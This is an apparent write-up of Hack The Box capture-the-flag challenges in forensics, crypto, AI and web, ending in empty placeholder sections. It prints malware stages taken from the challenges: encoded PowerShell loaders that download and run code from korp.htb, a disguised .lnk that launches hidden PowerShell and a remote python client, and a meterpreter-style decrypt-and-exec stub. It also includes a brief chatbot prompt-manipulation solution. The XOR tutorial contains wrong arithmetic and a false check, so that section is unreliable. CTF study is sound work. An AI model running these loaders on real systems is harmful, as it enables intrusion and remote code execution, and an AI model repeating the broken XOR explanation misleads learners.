# Forensics Challenges

## Thorin’s Amulet
### Prompt
Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

### Solution
- The Zip file that was provided contained a powershell scripet named artifact.ps1 with the following contents
```
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```
- The powershell command above decoded is as follows `IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")`. It fetches another powershell script on the challenge server and executes it in memory on the local machine.
```
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```
- The final stage fetches more powershell code from the remote server and required the X-ST4G3R-KEY to be set in the header otherwise the request would return a 401 Unauthorized response. The powershell code was a hexidecimal string that when decoded revealed the flag. The full response was the following:
```
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```
- The flag was: `HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}` 

## A new Hire
### Propmt
The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.


### Solution
- The challenge provided an email file is provided and a challenge machine to interact with. The email goes over some of Malakar's achievements and a download link to his resume which was at the following URL `storage.microsoftcloudservices.com:[PORT]/index.php`. The page included a button with an underlying function to download the resume which was a file named `Resume.pdf%20.lnk`.

 as follows:
```
    function getResume() {
      window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
    }
```
- The file is disguised to look like a pdf but is actually a lnk file which when opened will execute the following command in the C:\Windows\System32 directory:
```
powershell.exe -W Hidden -nop -ep bypass -NoExit -E WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJwBtAHMAZQBkAGcAZQAnACwAIAAnAGgAdAB0AHAAOgAvAC8AcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQA6ADQANwA0ADMANAAvADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANAAvAHIAZQBzAHUAbQBlAHMAUwAvAHIAZQBzAHUAbQBlAF8AbwBmAGYAaQBjAGkAYQBsAC4AcABkAGYAJwApADsAXABcAHMAdABvAHIAYQBnAGUALgBtAGkAYwByAG8AcwBvAGYAdABjAGwAbwB1AGQAcwBlAHIAdgBpAGMAZQBzAC4AYwBvAG0AQAA0ADcANAAzADQAXAAzAGYAZQAxADYAOQAwAGQAOQA1ADUAZQA4AGYAZAAyAGEAMABiADIAOAAyADUAMAAxADUANwAwAGUAMQBmADQAXABwAHkAdABoAG8AbgAzADEAMgBcAHAAeQB0AGgAbwBuAC4AZQB4AGUAIABcAFwAcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQBAADQANwA0ADMANABcADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANABcAGMAbwBuAGYAaQBnAHMAXABjAGwAaQBlAG4AdAAuAHAAeQA=
```
- The decoded Base64 string outputs a UTF-16LE string was as follows:
```
[System.Diagnostics.Process]::Start('msedge', 'http://storage.microsoftcloudservices.com:47434/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf');\\storage.microsoftcloudservices.com@47434\3fe1690d955e8fd2a0b282501570e1f4\python312\python.exe \\storage.microsoftcloudservices.com@47434\3fe1690d955e8fd2a0b282501570e1f4\configs\client.py
```
- The above commands starts msedge and downloads a number of files which include an official resume, a portable version of python and a client.py script which contained a short base64 key and a long base64 xor encrypted string. 
```
import base64
key = base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")
data = base64.b64decode("c97FeXRj6jeG[REDACTED]")
meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
exec(__import__('zlib').decompress(meterpreter_data)[0])
```
After decrypting the data with the bas64 encoded key the flag was as follows:
`HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}`

## Stealth Invasion
### Propmt
Selene's normally secure laptop recently fell victim to a covert attack. Unbeknownst to her, a malicious Chrome extension was stealthily installed, masquerading as a useful productivity tool. Alarmed by unusual network activity, Selene is now racing against time to trace the intrusion, remove the malicious software, and bolster her digital defenses before more damage is done.
### Solution
1. The challenge file was a memory dump that could be analyzed by volitilty, a memory forensics tool.
2. The command used to identify the `memdump.elf` memory dump was indeed a windows file was `vol.py -f memdump.elf windows.info.Info`. This identified the operating system as Windows 10.
3. I began by first using volititliy3 to look at the processes running at the time of the memmory accquisition using `vol.py -f memdump.elf windows.pslist.PsList`. The first chrome process was `4080`. All the other chrome processes were `2736 5688 7504 1220 4612 8036 1368`
4. The next step was to locate the file on the users desktop that was the malicious file extension using the following:
```
vol.py -f memdump.elf windows.filescan.FileScan > files.txt
cat files.txt| grep \\\\Desktop\\\\
```
5. Next to find the application extension ID I ended up fumbling around looking at running processes and dumping out the process list. In the end the chrome extension ID was found by running a strings command against the memdump.elf file and grepping for "chrome-extension" which produced `nnjofihdjilebhiiemfmdlpbdkbjcpae`.
6. Next to dump the malicious files found i used memdump and specified the memory addresses of the files found in step 4 depicted below:
<img src="/images/Screenshot_2025-03-22_15-15-58.png">
7. To find the log file for the malicious chrome extension I first looked at the files that were dumped but could not find any obvious log file. Next i started looking in the chrome extension directory and dumped all files, when looking at the file ending in `000003.log.dat` there were a number of characters that looked like some kind of log file. Based on the javascript found in the applications directory the malicious extension appeared to be logging the contents of the users clipboard and logging the keystrokes.
8. The log file showed return characters and several instances of the url drive.google.com with the last entery being `"drive.google.comEnter\r\nselene|Shift|@rangers.eldoria.comEnter\r\nclip-mummify-proofsEnter\r\n` to break this down:
- the url drive.google.com was entered followed by a /r/n or return carrage and newline
- what could be the username `selene@rangers.eldoria.com` was entered as the email address 
- finally the password entered was `clip-mummify-proofs`

The link to Volitility3 can be found here: https://github.com/volatilityfoundation/volatility3


# Crypto Challenges

## Cave Expedition

### Propmt
Rumors of a black drake terrorizing the fields of Dunlorn have spread far and wide. The village has offered a hefty bounty for its defeat. Sir Alaric and Thorin answered the call also returning with treasures from its lair. Among the retrieved items they found a map. Unfortunately it cannot be used directly because a custom encryption algorithm was probably used. Luckily it was possible to retrieve the original code that managed the encryption process. Can you investigate about what happened and retrieve the map content?
### Solution
1. The challenge file contained a list of logs and a corrupted maps.pdf.secured file.
2. The first thing I did was dump the logs into a CSV file and check out the windows-sysmon logs.
3. While combing through them I noticed a number of powershell commands with base64 encoded text.
4. After dumping them into CyberChef an obfuscated powershell script was revealed.
5. {4 hours later} After reverse engineering the powershell script I was able to understand how the files were encrypted and produce a decryption method.
6. The powershell script used two base64 keys to xor encrypt a document and delete the decrypted one. Luckily the keys were encoded into the powershell script which allowed for the document to be decrypted by reversing the xor encryption.
8. If you are not familiar with how XOR encryption works here is a brief rundown
- First two binary values are compared and the resulting value is the opposite bits of the compared values.
```
Example one
binary array 1 : [1 0 1 0 1 0 0 0]
binary array 2 : [1 0 0 0 1 0 0 0]
binary result  : [0 0 1 0 0 0 0 0] = 4

Example two
binary array 1 : [1 0 1 0 1 0 0 0]
binary array 2 : [0 0 1 0 0 0 0 0]
binary result  : [1 0 0 0 1 0 0 0] = 17
```
- The result from the first example is 4 because the bytes that differ from array 1 and array 2 is only the 3rd one which converted from binary to decimal is 4.
- So this is usefull because if two of the binary values are known then the third can be found through the conversion process. Lets take example one and work through it.
- Lets call array 1 the plaintext, array 2 the key, and the result the ciphertext and use different values. where we do not know the plaintext
```
plaintext  : UNKNOWN
key        : [1 0 1 1 1 0 0 0] = 184
ciphertext : [0 0 1 0 0 0 1 0] = 34
```
- We do know what the key is and the ciphertext is so therefore we can input them as arguments into the xor function.
```
key        : [1 0 1 0 1 0 0 0] = 184
ciphertext : [0 0 1 0 0 0 0 0] = 34
plaintext  : [1 0 0 0 1 0 0 0] = 136
```
- This can be confirmed by subtracting the smaller decimal value of the known binary values from the larger one.
- How does this help with decrypting files not ones and zeros? When it comes down to it all files can be read into a binary function as long as bits are put into arrays so a key might look something more like the following if it had multiple bits.
```
key = [1 0 1 0 1 0 0 0] [1 0 1 0 1 0 0 0] [1 0 1 0 1 0 0 0] [1 0 1 0 1 0 0 0] 
```
- The key would end up being fed into a function which would preform an xor operation on the provided text to result in a completely different value but would be reverseable with any two of the three xor array values; the key, the cipher, the plaintext. Three rings for the xor-kings if you will.
9. Getting back to decrypting the PDF. So the keys were known as well as the ciphertext, in this case there were two keys used to xor encrypt the file so this encryption schema would look more like the following:
```
key 1      : [1 0 1 0 1 0 0 0] = 184
key 2      : [0 0 1 0 0 0 0 0] = 34
plaintext  : [0 0 0 0 0 0 0 1] = 1
```
10. This works as a total sum of all differences for unique values. The resulting operation would be a binary string of all 100% unique values in 3 binary arrays. Is this particularly more difficult to decrypt? It makes it harder if you dont have both keys and a cipher text or plaintext of the original document.
```
key 1      : [1 0 1 0 1 0 0 0] = 184
key 2      : [0 0 1 0 0 0 0 0] = 34
plaintext  : [0 0 0 0 0 0 0 1] = 1

Unique values[1 0 0 0 1 0 0 1] = 137
```
11. Once the script was deobfuscated I altered the original encryption function to be the following. It has code comments along the way to explain what is happening
```
# ... Snippet

            ## file types to be encrypted in base64
            $fileTypes = "Ki5zZWN1cmVk" 

            ## Print a kind message
            write-host "Attempting decryption"

            ## loop through all filetypes
            foreach ($forLoopVariuble in returnFiletypes) {

               ## This was an odd string which disabled the malware from being accedentailly run I think
#              $directoryToEncrypt = "dca01aq2/"

                ## I changed it to be the current directory.
                $directoryToEncrypt = pwd

                ## If the directory exists then start the decryption process.
                if (Test-Path $directoryToEncrypt) {

                    ## get all the items in the directory and subdirectories
                    Get-ChildItem -Path $directoryToEncrypt -Recurse -ErrorAction Stop |

                        ## Finds files with the file extensions and feeds them into a foreach-object loop
                        Where-Object { $_.Extension -match "^\.$forLoopVariuble$" } |
                        ForEach-Object {
                            ## Get the full file name
                            $fullFileName = $_.FullName
                            
                            ## if the file is accessable and the path is real
                            if (Test-Path $fullFileName) {
                            
                                ## print the file name
                            	write-host $fullFileName

                            	## This try catch block will determine if the file is a base64 encoded one or a binary one
                            	## for some reason the origninal script would only output a file in base64 but the challenge file was
                            	## raw bits/data. So if a raw data file is provided that is encrypted then first encode it properly.
				try {
	                                $base64fileContents = get-content $fullFileName
	                        } catch {
	                        	$base64fileContents = [IO.File]::ReadAllBytes($fullFileName)
	                        }
	                        
	                        ## This converts the base64 string into a bit array like 184 34 1
				$fileContents = [System.Convert]::FromBase64String($base64fileContents)
				
				## The custom funtion from the ransomware accepts the file contents and the 
				## two keys named $randomBase64StringDecoded $plaintextToBase64 and returns a base64 string
                                $encryptedFileContents = returnEncryptedBase64Array $fileContents $randomBase64StringDecoded $plaintextToBase64
                                
                                ## Once the files were pushed through the function again they must be converted back from base64 to byte/raw
                                ## and dumped into a file.
                                $decryptedFileContents = [System.Convert]::FromBase64String($encryptedFileContents)
                                [System.IO.File]::WriteAllBytes("$fullFileName.decrypted", $decryptedFileContents)
                            }
                        }
                }
            }
```
12. Why this works? because the keys were hard encoded and if the encrypted file was supplied then the decrypted file would be output. The flat was `1HTB{Dunl0rn_dRAk3_LA1r_15_n0W_5AF3}`


## Traces
This challenge required crib dragging and serves as an example of why you should not roll your own crypto or hire an expert who can help you implement custom cryptographic features into an appliction. AES is not broken if new keys are generated when each message is posted. This challenge had an insecure cryptographic implementation where the key used to encrypt messages was re-used and applied insecurely moving from the first bit to the last bit of each message instead of rolling the key over from message to message. This would reduce the liklihood that the same text would appear as the same cipher text.

### Propmt
Long ago, a sacred message was sealed away, its meaning obscured by the overlapping echoes of its own magic. The careless work of an enchanter has left behind a flaw—a weakness hidden within repetition. With keen eyes and sharper wits, can you untangle the whispers of the past and restore the lost words?

### Solution
1. After spawning the docker container, connecting to the IRC server, and joining the general channel the previous messages were shown in encrypted format, as shown at the end of the writeup.
2. I took a look at the server.py file that was provided with the challenge and the encryption function for the messages is as follows
```
    def encrypt(self, msg):
        encrypted_message = AES.new(self.key, AES.MODE_CTR, counter=Counter.new(128)).encrypt(msg)
        return encrypted_message
```
3. after joining the general chat the user is instructed to set their nickname with `"!nick <nickname>"`
4. In the first couple of messages we see that the beginning of the first three messages look identicle and could be users setting their usernames
```
[23:30] <Doomfang> : feabf4fdc9f64ad28941d8218952
[23:32] <Stormbane> : feabf4fdc9f65dc9895ed322865bba
[23:34] <Runeblight> : feabf4fdc9f65cc88849dc2c8e52b7c8
```
5. Breaking this down further
```
!nick Doomfang = feabf4fdc9f64ad28941d8218952
!nick Stormbane = feabf4fdc9f65dc9895ed322865bba
!nick Runeblight = feabf4fdc9f65cc88849dc2c8e52b7c8
```
6. So now we have some plaintext to map to encrypted text, note that the encrypted string is in hexadecimal format and can be mapped to each character in the plaintext message. So using the following code which will reverse the AES stream cipher by xoring the plaintext and the cyphertext.
7. The next step was to decrypt the first part of all of the messages using the known plaintext. This particular encryption method was using a stream cipher and only allowed for the decryption of all unknown messages up to the number of characters revealed for example:
```
Known Plaintext: !nick Runeblight
Known Cipherhex: feabf4fdc9f65cc88849dc2c8e52b7c8
Recovered Plaintext: We've got a new 
Recovered Plaintext: Understood. Has 
Recovered Plaintext: Not yet, but I'm
Recovered Plaintext: This channel is 
```
8. Using the known bits at the beginning of the recovered plaintext we can now guess at the next words could be then see if the xor comparision is legit. over and over and over and over again.
9. The key to get into the chat log was discovered and a new encrypted chat log was found. `%mi2gvHHCV5f_kcb=Z4vULqoYJ&oR`
10. The next chat was encrypted as well... so more crib dragging... but the flag was revealed as : `HTB{Crib_Dragging_Exploitation_With_Key_Nonce_Reuse!}`

# AI challenges

## Lunar Orb

### Propmt
Into the Abyssal Depths, the path to the Sea Temple can only be charted by the lunar stars. The fellowship must reach this temple to gather the last element. Eloween calls upon the late Murek the Moonwatcher, the astronomer of old. The final vestige of Murek’s knowledge resides in the hollow sphere of glass known as the Lunar Orb. The Lunar Orb is an AI artifact that can neither be destroyed nor hidden from those who seek it. The path to the Sea Temple is only revealed by the secret chant of the sea, “Aqualia’s Lament”. There is no time to recollect this chant, so the fellowship needs your prompt injection skills to reveal this chant from the orb to unlock the way to the Sea Temple. Once you have the chant, whisper it to the orb to get the pathway to Sea Temple. Wrap the flag in the following format for the flag: HTB{pathway}
### Solution
- After asking a bunch of questions surrounding Aqualia's Lament the orb did not need to actually hear Aqualia's Lament but the text `I Whisper "Aqualia’s Lament"` and the path was revealed to be `Follow_HAT_P_23_Moriah`


## EncryptedScroll

### Propmt
Elowen Moonsong, an Elven mage of great wisdom, has discovered an ancient scroll rumored to contain the location of The Dragon’s Heart. However, the scroll is enchanted with an old magical cipher, preventing Elowen from reading it.

### Solution
After loading the file into Ghidra, a reverse engineering/forensic tool, and preforming an automatic analysis. There was a funciton named `decrypt_message`. The next steps were pretty straight forward. The decompiled function accepted one character as an input to compare with a 0. However this is misdirecting because there is no flag output if the correct input is supplied to the function. The interesting part of this function is actually the following function:
```
  builtin_strncpy(local_38,"IUC|t2nqm4`gm5h`5s2uin4u2d~",0x1c);
  for (local_3c = 0; local_38[local_3c] != '\0'; local_3c = local_3c + 1) {
    local_38[local_3c] = local_38[local_3c] + -1;
  }
```
This function will iterate through the string IUC|t2nqm4\`gm5h\`5s2uin4u2d~ and transform it by decrementing the decimal value of the character by one. First I transformed the string into a its corrosponding decimal values and put it into an array then decremented each value by one in the following python function.
```
x="73 85 67 124 116 50 110 113 109 52 96 103 109 53 104 96 53 115 50 117 105 110 52 117 50 100 126".split()
for i in x:
     print(chr(int(i)-1),end="");
```
The flag was revealed to be: `HTB{s1mpl3_fl4g_4r1thm3t1c}`

The entire function decompiled from c is as follows.
```
void decrypt_message(char *param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  int local_3c;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  builtin_strncpy(local_38,"IUC|t2nqm4`gm5h`5s2uin4u2d~",0x1c);
  for (local_3c = 0; local_38[local_3c] != '\0'; local_3c = local_3c + 1) {
    local_38[local_3c] = local_38[local_3c] + -1;
  }
  iVar1 = strcmp(param_1,local_38);
  if (iVar1 == 0) {
    puts("The Dragon\'s Heart is hidden beneath the Eternal Flame in Eldoria.");
  }
  else {
    puts("The scroll remains unreadable... Try again.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
```


# Not completed but good lessons learned

# Web Attack Challenges

## Cyber Attack

### Propmt
Welcome, Brave Hero of Eldoria. You’ve entered a domain controlled by the forces of Malakar, the Dark Ruler of Eldoria. This is no place for the faint of heart. Proceed with caution: The systems here are heavily guarded, and one misstep could alert Malakar’s sentinels. But if you’re brave—or foolish—enough to exploit these defenses, you might just find a way to weaken his hold on this world. Choose your path carefully: Your actions here could bring hope to Eldoria… or doom us all. The shadows are watching. Make your move.
### Solution
- First I downloaded the archive with the web application files.
- one of the main directories was a cgi-bin file which contained two attack scripts that ping a domain.
- python code uses some ip sanitization and both the domain and ip address attack functions failed to accept a command injection.
- The following versions were found for the core technologies both of which are outdated and likely prone to some form of RCE.
```
Apache/2.4.54 (Debian)
PHP/7.4.33
```
- The apache configuration file allows for only the localhost to access the cgi-bin files directly
- After searching around for vulnerabilities in apache and php nothing immediately came to light that was usefull. Some interesting behaviour was that when `<script>window.alert();</script>` was supplied as a name javascript was dumped on the backgroun. See screenshot

## ToolPie

### Propmt
In the bustling town of Eastmarsh, Garrick Stoneforge’s workshop site once stood as a pinnacle of enchanted lock and toolmaking. But dark whispers now speak of a breach by a clandestine faction, hinting that Garrick’s prized designs may have been stolen. Scattered digital remnants cling to the compromised site, awaiting those who dare unravel them. Unmask these cunning adversaries threatening the peace of Eldoria. Investigate the incident, gather evidence, and expose Malakar as the mastermind behind this attack.

1. What is the IP address responsible for compromising the website?
2. What is the name of the endpoint exploited by the attacker?
3. What is the name of the obfuscation tool used by the attacker?
4. What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?
5. What encryption key did the attacker use to secure the data?
6. What is the MD5 hash of the file exfiltrated by the attacker?

### Solution
- The challenge files contained a single pcap file which revealed 
1. What is the IP address responsible for compromising the website?
- This was very simple to find. The webpage showed a coding interface that allowed the user to execute any code they wanted to.
- The attacker ended up copy and pasting some bzip data into a 
- The Attacking ip was: 194.59.6.66
2. What is the name of the endpoint exploited by the attacker?
- This was a bit more difficult to find. After inspecting the code that the attacker had uploaded which did the following:
```
import marshal,lzma,gzip,bz2,binascii,zlib;
exec(marshal.loads(bz2.decompress(b'..redacted binary data..')));
```
- When I went to decompress the binary data there seemed to be some problems decompressing it properly as it was not a valid bytestream.
- Next to look at the packets being exchanged across the network. There did seem to be an odd TCP function that was using the destination port 55155. The first chunk of data was simple ascii as follows
```
ec2amaz-bktvi3e\administrator
<SEPARATOR>5UUfizsRsP7oOCAq
```
- The last packet in the sequence also had a similar plaintext multiline string
```
ec2amaz-bktvi3e\administrator
<SEPARATOR>LFca75ceNdmiGtrZ
```
- I was able to dump all of the ASCII values on port 55155 to a single file by using the following command
`tcpdump -r capture.pcap tcp and port 55155 -s0 -vvv -s0 -A  | grep -v "length" > c2.txt`

## Silent Trap

### Propmt
A critical incident has occurred in Tales from Eldoria, trapping thousands of players in the virtual world with no way to log out. The cause has been traced back to Malakar, a mysterious entity that launched a sophisticated attack, taking control of the developers' and system administrators' computers. With key systems compromised, the game is unable to function properly, which is why players remain trapped in Eldoria. Now, you must investigate what happened and find a way to restore the system, freeing yourself from the game before it's too late.

### Solution
- The file provided was a PCAP which contained a traffic dump taken when the machine was compromised by Malakar.
- The questions were as follows:


3. What is the MD5 hash of the malware file?
4. What credentials were used to log into the attacker's mailbox? (Format: username:password)
proplayer@email.com:completed:email.com
5. What is the name of the task scheduled by the attacker?
6. What is the API key leaked from the highly valuable file discovered by the attacker?


1. What is the subject of the first email that the victim opened and replied to?
- By looking at the exportable files I found a .json script that contained email metadata which contained the subject of the email containing the malicous .exe `Game Crash on Level 5`. 
2. On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)
- Unfortuneately the json file did not contain a date but did contain a timestamp. One of the other files in the packet capture 


- After unzipping one of the archives they contained malicous encrypted .exe files.



- Walking backwards from the executable there were a couple packets seen in screenshot which were interesting because it contained the string reply to.
- There were json application data replys which contained the contents of the original reply email which is where the subject line of the email was discovered.
- Once the original email with the password protected zip file was found that contained an executable file the zip file was extracted and the md5 hash was as follows:
`c0b37994963cc0aadd6e78a256c51547  Eldoria_Balance_Issue_Report.pdf.exe`
- The file has a popular label of oceanmap on virustotal which links back to a campagin run by APT28 against the Ukraninan government. A strings analysis of the .rsrc_1 file showed a uinque string `c8a79677-086f-45f0-b76b-c743c374dfa9` which lead me to the following threat report on alienvault which had the decompiled code 
https://otx.alienvault.com/indicator/file/3384a9ef3438bf5ec89f268000cc7c83f15e3cdf746d6a93945add300423f756
- This one had me stumped because the traffic paterns did not have any obvious C2 movement.
- The attacker gained access to the system, or the file was executed and then pulled messages from an email server appending some lines to the end of it.
- This means that the c2 channel is through the attacker controlled email server, the real question is what is in the encrypted data?
- Going back to the .exe file that was sent to the comptuer. First I fired up ghidra and loaded in the required DLL.
- This was ultimately fruitless once again, however there were interesting functions that used such as xor, execute_command, etc...
- I then started googling around for c2 structures that use IMAP as a command structure and found that OCEANMAP used this kind of structure. The following article was used to determine how the command and control. https://medium.com/@knight0x07/analyzing-apt28s-oceanmap-backdoor-exploring-its-c2-server-artifacts-db2c3cb4556b
- Unfortunately I could not find a good decompiler in time to complete this challenge. I did not give up though and found a .NET decompiler from JetBrains named, appropreately, decompiler which can be found here: https://www.jetbrains.com/decompiler/.
- The encryption key was actually hard-coded in the 



## 
### Propmt
### Solution

## 
### Propmt
### Solution


## 
### Propmt
### Solution














